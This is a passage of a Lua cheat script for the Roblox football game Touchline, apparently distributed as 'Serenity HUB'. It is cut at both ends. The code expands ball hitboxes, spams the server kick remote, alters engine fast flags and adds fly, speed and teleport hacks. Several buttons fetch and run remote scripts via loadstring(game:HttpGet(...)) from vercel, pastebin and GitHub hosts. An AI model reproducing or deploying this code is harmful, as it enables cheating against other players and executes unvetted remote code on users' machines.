            part.Transparency = targetTransparency
        end
    end
end

local function UpdatePlatformSystem(deltaTime)
    local character = LocalPlayer.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local smoothness = math.clamp(Smoothness, 0.1, 1)
    
    local alpha
    if smoothness >= 0.999 then alpha = 1
    else
        local response = 8 + (smoothness * 92)
        alpha = 1 - math.exp(-response * math.min(deltaTime, 1 / 15))
    end
    
    for ballPart in pairs(ballParts) do
        if not ballPart.Parent then
            ballParts[ballPart] = nil
            removePlatform(ballPart)
        else
            local inAir = true
            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Exclude
            params.FilterDescendantsInstances = {ballPart, character}
            local result = workspace:Raycast(ballPart.Position, Vector3.new(0, -3.25, 0), params)
            inAir = result == nil
            
            if inAir then
                local data = createPlatform(ballPart)
                local platform = data.part
                local targetPosition = ballPart.Position - Vector3.new(0, 2, 0)
                local newPosition = alpha >= 0.999 and targetPosition or data.lastPosition:Lerp(targetPosition, alpha)
                if (platform.Position - newPosition).Magnitude > 0.0001 then platform.Position = newPosition end
                data.lastPosition = newPosition
                
                if root then
                    local shouldCollide = root.Position.Y >= platform.Position.Y
                    if shouldCollide ~= data.lastCanCollide then
                        platform.CanCollide = shouldCollide
                        data.lastCanCollide = shouldCollide
                    end
                end
            else
                removePlatform(ballPart)
            end
        end
    end
end

local function StartPlatformSystem()
    if platformRunning or not PlatformEnabled then return end
    platformRunning = true
    platformConnection = RunService.Heartbeat:Connect(function(deltaTime)
        if not scriptAlive or not PlatformEnabled or not platformRunning then return end
        UpdatePlatformSystem(deltaTime)
    end)
end

local function StopPlatformSystem()
    platformRunning = false
    if platformConnection then platformConnection:Disconnect(); platformConnection = nil end
    ClearAllPlatforms()
end

-- ============================================
--  GK AUTO DIVE SYSTEM
-- ============================================

local function stopAnim()
    if liveTrack then pcall(function() liveTrack:Stop() end); liveTrack = nil end
    animPlaying = false
end

local function playAnim(char, animId)
    stopAnim()
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    animPlaying = true
    local anim = Instance.new("Animation")
    anim.AnimationId = animId
    local track = hum:LoadAnimation(anim)
    liveTrack = track
    track:Play()
    track.Stopped:Connect(function()
        animPlaying = false
        liveTrack = nil
        pcall(function() anim:Destroy() end)
    end)
    task.delay(4, function()
        if liveTrack == track then stopAnim(); pcall(function() anim:Destroy() end) end
    end)
end

local function getMostDangerousBall()
    local char = LocalPlayer.Character
    if not char then return nil, math.huge end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil, math.huge end
    local balls = getAllBalls()
    if #balls == 0 then return nil, math.huge end
    
    local bestBall, bestScore = nil, -math.huge
    for _, ball in ipairs(balls) do
        local toPlayer = hrp.Position - ball.Position
        local dist = toPlayer.Magnitude
        if dist > DIVE_RANGE then continue end
        local vel = ball.AssemblyLinearVelocity
        local speed = vel.Magnitude
        local approachFactor = 0
        if speed > 1 and dist > 0 then approachFactor = vel.Unit:Dot(toPlayer.Unit) end
        local score = (approachFactor * speed) + (1 / math.max(dist, 1)) * 10
        if score > bestScore then bestScore = score; bestBall = ball end
    end
    if not bestBall then
        local minDist = math.huge
        for _, ball in ipairs(balls) do
            local d = (ball.Position - hrp.Position).Magnitude
            if d < minDist then minDist = d; bestBall = ball end
        end
    end
    return bestBall
end

local function pickDive(hrp, ballPos)
    local lpos = hrp.CFrame:PointToObjectSpace(ballPos)
    if lpos.Y > 4 then
        return ANIM_HEADER, { Right = false, Ground = false, Left = false }
    end
    if math.abs(lpos.X) >= math.abs(lpos.Z) then
        if lpos.X > 0 then
            return ANIM_RIGHT, { Right = true, Ground = false, Left = false }
        else
            return ANIM_LEFT, { Right = false, Ground = false, Left = true }
        end
    else
        if lpos.Z < 0 then
            return ANIM_HEADER, { Right = false, Ground = false, Left = false }
        else
            return ANIM_BACK, { Right = false, Ground = false, Left = false }
        end
    end
end

local function reachTouchAll()
    for _, ball in ipairs(getAllBalls()) do
        local origSize = ball.Size
        local origCollide = ball.CanCollide
        pcall(function()
            ball.Size = Vector3.new(10, 10, 10)
            ball.CanCollide = false
        end)
        task.delay(0.18, function()
            pcall(function()
                if ball and ball.Parent then
                    ball.Size = origSize
                    ball.CanCollide = origCollide
                end
            end)
        end)
    end
end

local function fireAllKicks(hrp, flags)
    local remote = getKickRemote()
    if not remote then return end
    local cf = CFrame.new(hrp.Position, hrp.Position + hrp.CFrame.LookVector)
    for _, ball in ipairs(getAllBalls()) do
        local args = {{ ball, "Dive", 1, flags, cf, Vector3.zero }}
        pcall(function() remote:FireServer(unpack(args)) end)
    end
end

local function doDive(ball)
    if onCooldown or animPlaying then return end
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    onCooldown = true
    local ballPos = ball.Position
    local animId, flags = pickDive(hrp, ballPos)
    
    local flat = Vector3.new(ballPos.X - hrp.Position.X, 0, ballPos.Z - hrp.Position.Z)
    if flat.Magnitude < 0.01 then flat = hrp.CFrame.LookVector * Vector3.new(1, 0, 1) end
    flat = flat.Unit
    
    local launchVel = flat * DIVE_SPEED + Vector3.new(0, DIVE_LIFT, 0)
    hrp.AssemblyLinearVelocity = launchVel
    
    local frames = 0
    local pushConn = RunService.Heartbeat:Connect(function()
        frames += 1
        if frames <= 3 then pcall(function() hrp.AssemblyLinearVelocity = launchVel end)
        else pushConn:Disconnect() end
    end)
    
    playAnim(char, animId)
    
    for _, t in ipairs({0.08, 0.22, 0.38, 0.52}) do
        task.delay(t, function() reachTouchAll() end)
    end
    
    local loopStart = tick()
    local loopConn = RunService.PreSimulation:Connect(function()
        local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not h then loopConn:Disconnect(); return end
        for _, b in ipairs(getAllBalls()) do
            if (b.Position - h.Position).Magnitude < 5 then loopConn:Disconnect(); return end
        end
        if tick() - loopStart >= 3.5 then loopConn:Disconnect(); return end
        fireAllKicks(h, flags)
    end)
    
    task.delay(COOLDOWN, function() onCooldown = false end)
end

-- ============================================
--  PREDICTION SYSTEM
-- ============================================

local function makePredBeam(ball)
    local folder = workspace:FindFirstChild("_PredViz")
    if not folder then folder = Instance.new("Folder"); folder.Name = "_PredViz"; folder.Parent = workspace end
    
    local a0 = Instance.new("Attachment"); a0.Parent = workspace.Terrain
    local a1 = Instance.new("Attachment"); a1.Parent = workspace.Terrain
    
    local beam = Instance.new("Beam")
    beam.Attachment0 = a0
    beam.Attachment1 = a1
    beam.Width0 = 0.14
    beam.Width1 = 0.14
    beam.FaceCamera = true
    beam.LightInfluence = 0
    beam.Transparency = NumberSequence.new(0.15)
    beam.Parent = folder
    
    local sphere = Instance.new("Part")
    sphere.Anchored = true
    sphere.CanCollide = false
    sphere.Shape = Enum.PartType.Ball
    sphere.Size = Vector3.new(0.6, 0.6, 0.6)
    sphere.Material = Enum.Material.Neon
    sphere.Color = Color3.fromRGB(255, 220, 0)
    sphere.Transparency = 0.25
    sphere.CFrame = CFrame.new(0, -9999, 0)
    sphere.Parent = folder
    
    predObjs[ball] = { beam = beam, a0 = a0, a1 = a1, sphere = sphere }
end

local function cleanPredObjs()
    for _, t in pairs(predObjs) do
        pcall(function() t.beam:Destroy() end)
        pcall(function() t.a0:Destroy() end)
        pcall(function() t.a1:Destroy() end)
        pcall(function() t.sphere:Destroy() end)
    end
    predObjs = {}
    local f = workspace:FindFirstChild("_PredViz")
    if f then f:Destroy() end
end

local function simulateLanding(pos, vel)
    local px, py, pz = pos.X, pos.Y, pos.Z
    local vx, vy, vz = vel.X, vel.Y, vel.Z
    local dt = 0.03
    local steps = math.floor(PRED_TIME / dt)
    for _ = 1, steps do
        vy = vy + PRED_GRAVITY * dt * dt
        px = px + vx * dt
        py = py + vy * dt
        pz = pz + vz * dt
        if py <= 1 then py = 1; break end
    end
    return Vector3.new(px, py, pz)
end

local function startPred()
    if predConn then predConn:Disconnect() end
    predConn = RunService.Heartbeat:Connect(function()
        if not predOn then return end
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local folder = getFootballFolder()
        
        for ball in pairs(predObjs) do
            if not ball or not ball.Parent then
                pcall(function()
                    local t = predObjs[ball]
                    if t then
                        pcall(function() t.beam:Destroy() end)
                        pcall(function() t.a0:Destroy() end)
                        pcall(function() t.a1:Destroy() end)
                        pcall(function() t.sphere:Destroy() end)
                    end
                end)
                predObjs[ball] = nil
            end
        end
        
        if not folder then return end
        for _, ball in folder:GetChildren() do
            if ball:IsA("BasePart") then
                local dist = (ball.Position - hrp.Position).Magnitude
                if dist <= PRED_RANGE then
                    if not predObjs[ball] then makePredBeam(ball) end
                    local t = predObjs[ball]
                    local vel = ball.AssemblyLinearVelocity
                    local landing = simulateLanding(ball.Position, vel)
                    
                    local predPos = Vector3.new(
                        ball.Position.X + vel.X * cachedPingGlobal,
                        ball.Position.Y + vel.Y * cachedPingGlobal,
                        ball.Position.Z + vel.Z * cachedPingGlobal
                    )
                    local reachable = (predPos - hrp.Position).Magnitude < PRED_TOUCH
                    local col = reachable and Color3.fromRGB(0, 255, 80) or Color3.fromRGB(255, 40, 40)
                    
                    t.beam.Color = ColorSequence.new(col)
                    t.a0.WorldPosition = ball.Position
                    t.a1.WorldPosition = landing
                    t.sphere.CFrame = CFrame.new(landing)
                else
                    if predObjs[ball] then
                        local t = predObjs[ball]
                        pcall(function() t.a0.WorldPosition = Vector3.new(0, -9999, 0) end)
                        pcall(function() t.a1.WorldPosition = Vector3.new(0, -9999, 0) end)
                        pcall(function() t.sphere.CFrame = CFrame.new(0, -9999, 0) end)
                    end
                end
            end
        end
    end)
end

-- ============================================
--  REACT SYSTEM (Flags)
-- ============================================

local function sf(k, v)
    if not setfflag then return end
    local ck = k:gsub("^DFInt",""):gsub("^DFFlag",""):gsub("^FFlag",""):gsub("^FInt","")
    pcall(function()
        if getfflag and getfflag(ck) ~= nil then setfflag(ck, v)
        else setfflag(k, v) end
    end)
end

local function applyReact(tt, interp)
    _lastReactTT = tt
    _lastReactInterp = interp
    if _reactThread then task.cancel(_reactThread); _reactThread = nil end
    if not _reactActive then return end
    local flags = {
        ["DFIntTargetTimeDelayFacctorTenths"] = tt,
        ["FIntInterpolationMaxDelayMSec"] = interp,
    }
    _reactThread = task.spawn(function()
        while true do
            for k, v in pairs(flags) do
                pcall(function() sf(k, v) end)
            end
            task.wait(20)
        end
    end)
end

local function applyGkReact(tt, interp)
    _lastGkReactTT = tt
    _lastGkReactInterp = interp
    if _gkReactThread then task.cancel(_gkReactThread); _gkReactThread = nil end
    if not _gkReactActive then return end
    local flags = {
        ["DFIntTargetTimeDelayFacctorTenths"] = tt,
        ["FIntInterpolationMaxDelayMSec"] = interp,
    }
    _gkReactThread = task.spawn(function()
        while true do
            for k, v in pairs(flags) do
                pcall(function() sf(k, v) end)
            end
            task.wait(20)
        end
    end)
end

-- ============================================
--  200 KICKS PER SECOND
-- ============================================

local function fireKick()
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    local ball, dist = getClosestFootball()
    if not ball or dist > kickReach then return end
    
    local kickRemote = getKickRemote()
    if not kickRemote then return end
    
    local Camera = workspace.CurrentCamera
    if not Camera then return end
    
    local lookVector = Camera.CFrame.LookVector
    local direction = CFrame.new(
        hrp.Position + lookVector * 5,
        hrp.Position + lookVector * 10
    )
    
    local args = {{
        ball,
        "Shoot",
        1,
        { Right = false, Ground = true, Left = false },
        direction,
        Vector3.zero
    }}
    
    pcall(function() kickRemote:FireServer(unpack(args)) end)
end

-- ============================================
--  FLY SYSTEM
-- ============================================

local function flyCleanup()
    if flyBV then pcall(function() flyBV:Destroy() end); flyBV = nil end
    pcall(function()
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then hum.PlatformStand = false end
    end)
end

-- ============================================
--  WALKSPEED Y JUMP POWER
-- ============================================

local function SetWalkSpeedSafely(humanoid, value)
    if not humanoid or not humanoid.Parent then return end
    if humanoid.WalkSpeed == value then return end
    changingWalkSpeed = true
    humanoid.WalkSpeed = value
    changingWalkSpeed = false
end

local function ApplyWalkSpeed(character)
    if not WalkSpeedEnabled or isCharacterRespawning then return end
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        currentHumanoid = humanoid
        SetWalkSpeedSafely(humanoid, WalkSpeedValue)
    end
end

local function StopWalkSpeedLoop(restoreDefault)
    if walkSpeedConnection then walkSpeedConnection:Disconnect(); walkSpeedConnection = nil end
    local humanoid = currentHumanoid or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
    if restoreDefault and humanoid then SetWalkSpeedSafely(humanoid, DefaultWalkSpeed) end
    currentHumanoid = nil
end

local function StartWalkSpeedLoop()
    StopWalkSpeedLoop(false)
    if not WalkSpeedEnabled then return end
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    DefaultWalkSpeed = humanoid.WalkSpeed
    currentHumanoid = humanoid
    SetWalkSpeedSafely(humanoid, WalkSpeedValue)
    walkSpeedConnection = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if not scriptAlive or not WalkSpeedEnabled or changingWalkSpeed then return end
        if humanoid ~= currentHumanoid or not humanoid.Parent then return end
        SetWalkSpeedSafely(humanoid, WalkSpeedValue)
    end)
end

local function ApplyJumpPower(character)
    if not JumpPowerEnabled or isCharacterRespawning then return end
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.JumpPower = JumpPowerValue
        pcall(function() humanoid.JumpHeight = JumpPowerValue / 7 end)
    end
end

local function ResetJumpPower(character)
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.JumpPower = DefaultJumpPower
        pcall(function() humanoid.JumpHeight = DefaultJumpPower / 7 end)
    end
end

local function OnCharacterAdded(character)
    isCharacterRespawning = true
    local humanoid = character:WaitForChild("Humanoid")
    if not scriptAlive or not character.Parent then return end
    DefaultWalkSpeed = humanoid.WalkSpeed
    DefaultJumpPower = humanoid.JumpPower
    currentHumanoid = humanoid
    isCharacterRespawning = false
    if WalkSpeedEnabled then StartWalkSpeedLoop() end
    if JumpPowerEnabled then ApplyJumpPower(character) end
end

TrackConnection(LocalPlayer.CharacterAdded:Connect(OnCharacterAdded))

if LocalPlayer.Character then
    task.spawn(OnCharacterAdded, LocalPlayer.Character)
end

-- ============================================
--  UI - SERENITY HUB
-- ============================================

local ModernV2 = loadstring(game:HttpGet("https://robloxui.vercel.app/"))()

local Window = ModernV2:Window({
    Title = "Serenity HUB",
    Content = "Touchline",
    Color = PURPLE,
    Size = UDim2.fromOffset(550, 400),
    ShowUser = true,
    Search = true,
    Config = { ConfigFolder = "SerenityHubConfigs", AutoSave = false },
})

-- ============================================
--  TAB 1: HOME
-- ============================================

local HomeTab = Window:AddTab({ Name = "Home", Icon = "box", Type = "Double" })
local HomeSection = HomeTab:AddSection({ Name = "SERENITY HUB", Position = "Center" })

HomeSection:AddButton({ Name = "Made By 0m3", Callback = function() end })
HomeSection:AddButton({ Name = "Last Update: 8/8/2026", Callback = function() end })
HomeSection:AddButton({ Name = "SerenityOnTop!", Callback = function() end })

-- ============================================
--  TAB 2: REACH
-- ============================================

local ReachTab = Window:AddTab({ Name = "Reach", Icon = "crosshairs", Type = "Double" })

-- MÉTODO 1: REACH NO BALL COLLISION
local Method1Section = ReachTab:AddSection({ Name = "REACH NO BALL COLLISION", Position = "Center" })

Method1Section:AddToggle({
    Name = "Enable Reach No Ball Collision",
    Default = m1_enabled,
    Flag = "method1",
    Callback = function(v)
        if v and reachMethod2Enabled then
            reachMethod2Enabled = false
            StopMethod2()
        end
        m1_enabled = v
        if v then StartMethod1() else StopMethod1() end
    end
})

Method1Section:AddSlider({
    Name = "Reach Size",
    Default = m1_size,
    Min = 1,
    Max = 30,
    Flag = "method1_size",
    Callback = function(v)
        m1_size = v
        if m1_enabled then UpdateVisualizers(m1_size, m1_transparency) end
    end
})

Method1Section:AddSlider({
    Name = "Visualizer Transparency",
    Default = m1_transparency * 100,
    Min = 0,
    Max = 100,
    Flag = "method1_trans",
    Callback = function(v)
        m1_transparency = v / 100
        if m1_enabled then UpdateVisualizers(m1_size, m1_transparency) end
    end
})

-- BALL COLLISION PROXY (SOLO TOGGLE)
Method1Section:AddDivider()
Method1Section:AddLabel({ Name = "BALL COLLISION PROXY" })

Method1Section:AddToggle({
    Name = "Enable Collision Proxy",
    Default = proxyEnabled,
    Flag = "proxy_enable",
    Callback = function(v)
        proxyEnabled = v
        if v then StartProxySystem() else StopProxySystem() end
    end
})

-- MÉTODO 2: REACH BALL COLLISION
local Method2Section = ReachTab:AddSection({ Name = "REACH BALL COLLISION", Position = "Center" })

Method2Section:AddToggle({
    Name = "Enable Reach Ball Collision",
    Default = reachMethod2Enabled,
    Flag = "method2",
    Callback = function(v)
        if v and m1_enabled then
            m1_enabled = false
            StopMethod1()
        end
        reachMethod2Enabled = v
        if v then StartMethod2() else StopMethod2() end
    end
})

Method2Section:AddSlider({
    Name = "Reach Size",
    Default = REACH_SIZE,
    Min = 1,
    Max = 30,
    Flag = "method2_size",
    Callback = function(v)
        REACH_SIZE = v
        if reachMethod2Enabled and getgenv().Reach then
            getgenv().Reach.Size = v
            for ball, visualizer in pairs(ballVisualizers) do
                if ball and ball.Parent and visualizer and visualizer.Parent then
                    visualizer.Size = Vector3.new(v, v, v)
                end
            end
        end
    end
})

Method2Section:AddSlider({
    Name = "Visualizer Transparency",
    Default = reachTransparency2 * 100,
    Min = 0,
    Max = 100,
    Flag = "method2_trans",
    Callback = function(v)
        reachTransparency2 = v / 100
        if reachMethod2Enabled and getgenv().Reach then
            getgenv().Reach.Transparency = reachTransparency2
            for ball, visualizer in pairs(ballVisualizers) do
                if ball and ball.Parent and visualizer and visualizer.Parent then
                    visualizer.Transparency = reachTransparency2
                end
            end
        end
    end
})

-- CHARACTER REACH
local CharacterReachSection = ReachTab:AddSection({ Name = "CHARACTER REACH", Position = "Center" })

CharacterReachSection:AddToggle({
    Name = "Character Reach",
    Default = CharacterReachEnabled,
    Flag = "charreach",
    Callback = function(v)
        CharacterReachEnabled = v
        if v then StartCharacterReachSystem() else StopCharacterReachSystem() end
    end
})

CharacterReachSection:AddSlider({
    Name = "Char Reach Size",
    Default = CharacterReachSize,
    Min = 1,
    Max = 30,
    Flag = "charreach_size",
    Callback = function(v)
        CharacterReachSize = v
        if CharacterReachEnabled then RefreshCharacterReach() end
    end
})

CharacterReachSection:AddSlider({
    Name = "Char Visualizer",
    Default = CharacterVisualizerIntensity * 100,
    Min = 0,
    Max = 100,
    Flag = "charreach_vis",
    Callback = function(v)
        CharacterVisualizerIntensity = v / 100
        if CharacterReachEnabled then RefreshCharacterReach() end
    end
})

-- ============================================
--  TAB 3: REACT
-- ============================================

local ReactTab = Window:AddTab({ Name = "React", Icon = "eye", Type = "Double" })

local ReactSection = ReactTab:AddSection({ Name = "REACT SETTINGS", Position = "Center" })

ReactSection:AddToggle({
    Name = "Enable React",
    Default = _reactActive,
    Flag = "react_enable",
    Callback = function(v)
        _reactActive = v
        if not v then
            if _reactThread then task.cancel(_reactThread); _reactThread = nil end
        else
            applyReact(_lastReactTT, _lastReactInterp)
        end
    end
})

ReactSection:AddButton({
    Name = "React 15% (Safest)",
    Callback = function() applyReact("13", "90") end
})

ReactSection:AddButton({
    Name = "React 25% (Light)",
    Callback = function() applyReact("12", "85") end
})

ReactSection:AddButton({
    Name = "React 50% (Balanced)",
    Callback = function() applyReact("10", "75") end
})

ReactSection:AddButton({
    Name = "React 75% (Aggressive)",
    Callback = function() applyReact("8", "67") end
})

ReactSection:AddButton({
    Name = "React 100% (Maximum)",
    Callback = function() applyReact("6", "70") end
})

-- GK REACT
local GKReactSection = ReactTab:AddSection({ Name = "GK REACT", Position = "Center" })

GKReactSection:AddToggle({
    Name = "Enable GK React",
    Default = _gkReactActive,
    Flag = "gkreact_enable",
    Callback = function(v)
        _gkReactActive = v
        if not v then
            if _gkReactThread then task.cancel(_gkReactThread); _gkReactThread = nil end
        else
            applyGkReact(_lastGkReactTT, _lastGkReactInterp)
        end
    end
})

GKReactSection:AddButton({
    Name = "GK React 15% (Safest)",
    Callback = function() applyGkReact("13", "90") end
})

GKReactSection:AddButton({
    Name = "GK React 25% (Light)",
    Callback = function() applyGkReact("12", "85") end
})

GKReactSection:AddButton({
    Name = "GK React 50% (Balanced)",
    Callback = function() applyGkReact("10", "75") end
})

GKReactSection:AddButton({
    Name = "GK React 75% (Aggressive)",
    Callback = function() applyGkReact("8", "67") end
})

GKReactSection:AddButton({
    Name = "GK React 100% (Maximum)",
    Callback = function() applyGkReact("6", "70") end
})

-- ============================================
--  TAB 4: MOVEMENT
-- ============================================

local MoveTab = Window:AddTab({ Name = "Movement", Icon = "user", Type = "Double" })

local MoveSection = MoveTab:AddSection({ Name = "MOVEMENT", Position = "Center" })

MoveSection:AddToggle({
    Name = "WalkSpeed Enabled",
    Default = WalkSpeedEnabled,
    Flag = "walkspeed",
    Callback = function(v)
        WalkSpeedEnabled = v
        if v then StartWalkSpeedLoop() else StopWalkSpeedLoop(true) end
    end
})

MoveSection:AddSlider({
    Name = "WalkSpeed",
    Default = WalkSpeedValue,
    Min = 16,
    Max = 50,
    Flag = "walkspeed_value",
    Callback = function(v)
        WalkSpeedValue = v
        if WalkSpeedEnabled then ApplyWalkSpeed(LocalPlayer.Character) end
    end
})

MoveSection:AddToggle({
    Name = "Jump Power Enabled",
    Default = JumpPowerEnabled,
    Flag = "jumppower",
    Callback = function(v)
        JumpPowerEnabled = v
        if not v then
            pcall(function()
                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
                if hum then hum.JumpPower = 50 end
            end)
        end
    end
})

MoveSection:AddSlider({
    Name = "Jump Power",
    Default = JumpPowerValue,
    Min = 50,
    Max = 200,
    Flag = "jumppower_value",
    Callback = function(v)
        JumpPowerValue = v
        if JumpPowerEnabled then
            pcall(function()
                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
                if hum then hum.JumpPower = JumpPowerValue end
            end)
        end
    end
})

-- FLY
local FlySection = MoveTab:AddSection({ Name = "FLY", Position = "Center" })

FlySection:AddToggle({
    Name = "Enable Fly",
    Default = flyEnabled,
    Flag = "fly",
    Callback = function(v)
        flyEnabled = v
        if v then
            if flyConn then flyConn:Disconnect() end
            flyConn = RunService.Heartbeat:Connect(function()
                if not flyEnabled then flyCleanup(); return end
                local char = LocalPlayer.Character
                if not char then return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                local hum = char:FindFirstChild("Humanoid")
                if not hum then return end
                hum.PlatformStand = true
                if not flyBV or not flyBV.Parent then
                    flyBV = Instance.new("BodyVelocity", hrp)
                    flyBV.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                end
                local move = hum.MoveDirection
                local upVec = UserInputService:IsKeyDown(Enum.KeyCode.Space) and Vector3.new(0, 1, 0) or Vector3.zero
                local downVec = (UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or UserInputService:IsKeyDown(Enum.KeyCode.RightControl)) and Vector3.new(0, -1, 0) or Vector3.zero
                local dir = (move.Magnitude > 0.1 and move or Vector3.zero) + upVec + downVec
                flyBV.Velocity = dir.Magnitude > 0 and dir.Unit * flySpeed or Vector3.zero
            end)
        else
            flyCleanup()
            if flyConn then flyConn:Disconnect(); flyConn = nil end
        end
    end
})

FlySection:AddSlider({
    Name = "Fly Speed",
    Default = flySpeed,
    Min = 10,
    Max = 120,
    Flag = "flyspeed",
    Callback = function(v) flySpeed = v end
})

-- TP WALK
local TPSection = MoveTab:AddSection({ Name = "TP WALK", Position = "Center" })

TPSection:AddToggle({
    Name = "Enable TP Walk",
    Default = tpEnabled,
    Flag = "tpwalk",
    Callback = function(v)
        tpEnabled = v
        if v then
            if tpConn then tpConn:Disconnect() end
            tpConn = RunService.Heartbeat:Connect(function()
                if not tpEnabled then return end
                local char = LocalPlayer.Character
                if not char then return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                local hum = char:FindFirstChild("Humanoid")
                if not hum then return end
                if hum.MoveDirection.Magnitude < 0.1 then return end
                hrp.CFrame = hrp.CFrame + hum.MoveDirection * tpSpeed
            end)
        else
            if tpConn then tpConn:Disconnect(); tpConn = nil end
        end
    end
})

TPSection:AddSlider({
    Name = "TP Speed",
    Default = tpSpeed,
    Min = 1,
    Max = 12,
    Flag = "tpspeed",
    Callback = function(v) tpSpeed = v end
})

-- ============================================
--  TAB 5: MISC
-- ============================================

local MiscTab = Window:AddTab({ Name = "Misc", Icon = "box", Type = "Double" })

local MiscSection = MiscTab:AddSection({ Name = "MISCELLANEOUS", Position = "Center" })

MiscSection:AddButton({
    Name = "Fullbright",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/5ic4YxBU", true))()
    end
})

MiscSection:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})

-- AVATAR STEALER CON TEXTBOX
local AvatarSection = MiscTab:AddSection({ Name = "AVATAR STEALER", Position = "Center" })

AvatarSection:AddInput({
    Name = "Username",
    Placeholder = "Escribe un nombre de usuario...",
    Flag = "avatar_username",
    Callback = function(v)
        if v and v ~= "" then
            StealAvatarByName(v)
        end
    end
})

AvatarSection:AddButton({
    Name = "Steal Avatar",
    Callback = function()
        -- El botón es opcional, ya que el Input ejecuta al escribir
    end
})

-- ============================================
--  TAB 6: PREDICTION
-- ============================================

local PredTab = Window:AddTab({ Name = "Prediction", Icon = "compass", Type = "Double" })

local PredSection = PredTab:AddSection({ Name = "BALL PREDICTION", Position = "Center" })

PredSection:AddToggle({
    Name = "Enable Prediction",
    Default = predOn,
    Flag = "prediction",
    Callback = function(v)
        predOn = v
        if predOn then
            startPred()
        else
            cleanPredObjs()
            if predConn then predConn:Disconnect(); predConn = nil end
        end
    end
})

PredSection:AddSlider({
    Name = "Reachable Threshold",
    Default = PRED_TOUCH,
    Min = 2,
    Max = 12,
    Flag = "predtouch",
    Callback = function(v) PRED_TOUCH = v end
})

PredSection:AddSlider({
    Name = "Track Range",
    Default = PRED_RANGE,
    Min = 5,
    Max = 40,
    Flag = "predrange",
    Callback = function(v) PRED_RANGE = v end
})

PredSection:AddSlider({
    Name = "Predict Ahead",
    Default = 14,
    Min = 5,
    Max = 30,
    Flag = "predtime",
    Callback = function(v) PRED_TIME = v / 10 end
})

-- ============================================
--  TAB 7: GK
-- ============================================

local GkTab = Window:AddTab({ Name = "GK", Icon = "crosshairs", Type = "Double" })

local GkSection = GkTab:AddSection({ Name = "AUTO DIVE", Position = "Center" })

GkSection:AddToggle({
    Name = "Enable Auto Dive",
    Default = gkAutoDiveEnabled,
    Flag = "autodive",
    Callback = function(v)
        gkAutoDiveEnabled = v
        if not v then stopAnim() end
    end
})

GkSection:AddSlider({
    Name = "Dive Range",
    Default = DIVE_RANGE,
    Min = 10,
    Max = 60,
    Flag = "diverange",
    Callback = function(v) DIVE_RANGE = v end
})

GkSection:AddSlider({
    Name = "Dive Speed",
    Default = DIVE_SPEED,
    Min = 20,
    Max = 100,
    Flag = "divespeed",
    Callback = function(v) DIVE_SPEED = v end
})

GkSection:AddSlider({
    Name = "Dive Lift",
    Default = DIVE_LIFT,
    Min = 5,
    Max = 50,
    Flag = "divelift",
    Callback = function(v) DIVE_LIFT = v end
})

GkSection:AddSlider({
    Name = "Cooldown",
    Default = COOLDOWN,
    Min = 0,
    Max = 3,
    Flag = "divecooldown",
    Callback = function(v) COOLDOWN = v end
})

GkSection:AddSlider({
    Name = "Hit Radius",
    Default = HIT_RADIUS,
    Min = 2,
    Max = 15,
    Flag = "hitradius",
    Callback = function(v) HIT_RADIUS = v end
})

-- ============================================
--  TAB 8: EXTRAS
-- ============================================

local ExtrasTab = Window:AddTab({ Name = "Extras", Icon = "box", Type = "Double" })

-- 200 KICKS
local KicksSection = ExtrasTab:AddSection({ Name = "200 KICKS PER SECOND", Position = "Center" })

KicksSection:AddToggle({
    Name = "Enable Kick Loop",
    Default = kickLoopEnabled,
    Flag = "kickloop",
    Callback = function(v)
        kickLoopEnabled = v
        if v then
            if not kickConnection then
                kickConnection = RunService.PreSimulation:Connect(function()
                    if kickLoopEnabled then fireKick() end
                end)
            end
        else
            if kickConnection then kickConnection:Disconnect(); kickConnection = nil end
        end
    end
})

KicksSection:AddSlider({
    Name = "Kick Reach",
    Default = kickReach,
    Min = 5,
    Max = 50,
    Flag = "kickreach",
    Callback = function(v) kickReach = v end
})

-- INF DRIBBLE
local DribbleSection = ExtrasTab:AddSection({ Name = "INF DRIBBLE", Position = "Center" })

DribbleSection:AddToggle({
    Name = "Enable INF Dribble",
    Default = dribbleEnabled,
    Flag = "dribble",
    Callback = function(v)
        dribbleEnabled = v
        if v then
            if dribbleConn then dribbleConn:Disconnect() end
            dribbleConn = RunService.Heartbeat:Connect(function()
                if not dribbleEnabled then return end
                local char = LocalPlayer.Character
                if not char then return end
                local hum = char:FindFirstChild("Humanoid")
                if not hum then return end
                local ball = getClosestFootball()
                if not ball then return end
                hum.WalkSpeed = dribbleSpeed
                hum:MoveTo(ball.Position)
            end)
        else
            if dribbleConn then dribbleConn:Disconnect(); dribbleConn = nil end
            pcall(function()
                local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
                if hum then hum.WalkSpeed = 26 end
            end)
        end
    end
})

DribbleSection:AddSlider({
